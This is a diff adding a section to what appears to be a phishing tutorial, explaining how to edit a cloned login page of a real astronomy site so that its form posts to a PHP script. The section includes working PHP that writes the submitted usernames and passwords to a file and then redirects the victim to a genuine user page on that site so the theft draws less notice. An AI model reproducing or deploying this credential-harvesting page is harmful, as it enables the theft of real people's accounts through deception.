@@ -128,3 +128,44 @@ Once we have completed all of the above steps we can test if it has worked by na
 
 ![phishing4](/images/12.png)
 
+### Amending Source Code
+
+Before we continue with getting the domain name and https certificate sorted, we need to edit the source code of the fake login page so it harvests credentials which are entered on it.
+
+We can first of all open the page in a browser and use the *dev tools* to look for the *login form* - we can use the *inspector* tool to easily do this.
+
+>[!NOTE]
+>In HTML a `<form></form>` element wraps all the form input together - we will find the username and password input fields inside a *form* element
+
+Once we have found the correct login form, we need to check for any *id* parameters which may have been set on the form element itself or the button element which submits the entered data. If we find any *id* parameters on these elements we just need to delete them since they can be used by code elsewhere to mess up our phishing attempts.
+
+We can then find the `action=` parameter and change it so it navigates to a malicious PHP script which will harvest the credentials.
+
+>[!NOTE]
+>The `action` parameter specifies what should happen to the input data once the submit button has been clicked - we want it to send the data to a malicious PHP script
+
+![source code 1](/images/30.png)
+
+We can now create the malicioius PHP script:
+
+```php
+<?php
+
+$username = $_POST["auth-username"];
+$password = $_POST["auth-password"];
+
+$myfile = fopen("data/data.txt", "a+") or die("Unable to open file!");
+
+$txt = "\nUsername: " . $username . "\nPassword: " . $password;
+fwrite($myfile, $txt);
+fclose($myfile);
+
+header('Location: https://www.astrobin.com/users/Astro_Backyard/');
+?>
+```
+
+In the above code, we use the values given in the original login page source code for the `name` parameter in the `<input>` elements for the username and password - in this case these are `auth-username` and `auth-password` respectively but will be different for different websites - just check the source code of the page you are copying.
+
+We also add a redirect to a legitimate part of the website we are using to help with our phishing activities to make the attack less suspicious - we do this by adding a `Location` header.
+
+![source code 2](/images/31.png)
